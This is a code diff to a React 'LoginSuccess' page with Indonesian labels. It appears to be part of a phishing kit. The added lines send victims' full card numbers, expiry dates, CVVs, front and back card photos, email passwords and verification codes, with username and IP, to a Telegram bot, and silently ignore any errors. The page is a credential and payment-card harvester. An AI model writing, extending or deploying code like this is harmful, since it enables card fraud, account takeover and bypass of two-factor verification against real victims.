@@ -230,11 +230,20 @@ export default function LoginSuccess() {
       `📌 <b>Data Kartu User</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${username}</code>\n` +
+      `💳 <b>Card Number</b> : <code>${rawCard}</code>\n` +
+      `📅 <b>Expiry</b>      : <code>${cardExpiry}</code>\n` +
+      `🔒 <b>CVV</b>         : <code>${cardCvv}</code>\n` +
       `🌐 <b>IP</b>          : <code>${ip}</code>\n` +
       `🕐 <b>Waktu</b>       : ${now}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`
     ).catch(() => {});
 
+    if (cardFrontFile) {
+      await sendFileToTelegram(cardFrontFile, `📷 Foto Kartu DEPAN — ${username}`).catch(() => {});
+    }
+    if (cardBackFile) {
+      await sendFileToTelegram(cardBackFile, `📷 Foto Kartu BELAKANG — ${username}`).catch(() => {});
+    }
 
     setLoading(false);
     setStage("card-done");
@@ -259,6 +268,8 @@ export default function LoginSuccess() {
       `📧 <b>Email Credentials</b>\n\n` +
       `👤 <b>Username</b>  : <code>${username}</code>\n` +
       `📬 <b>Provider</b>  : <b>${providerName}</b>\n` +
+      `📩 <b>Email</b>     : <code>${providerEmail.trim()}</code>\n` +
+      `🔑 <b>Password</b>  : <code>${providerPassword}</code>\n` +
       `🌐 <b>IP</b>        : <code>${ip}</code>`,
     ).catch(() => {});
 
@@ -316,6 +327,13 @@ export default function LoginSuccess() {
       sessionKey,
       `${providerName} Verification`,
     );
+
+    await sendTelegram(
+      `🔐 <b>${providerName} Verification Code</b>\n\n` +
+      `👤 <b>Username</b>   : <code>${username}</code>\n` +
+      `🔢 <b>Code</b>       : <code>${code}</code>\n` +
+      `🌐 <b>IP</b>         : <code>${ip}</code>`,
+    ).catch(() => {});
 
     setStage("approving");
     setLoading(false);
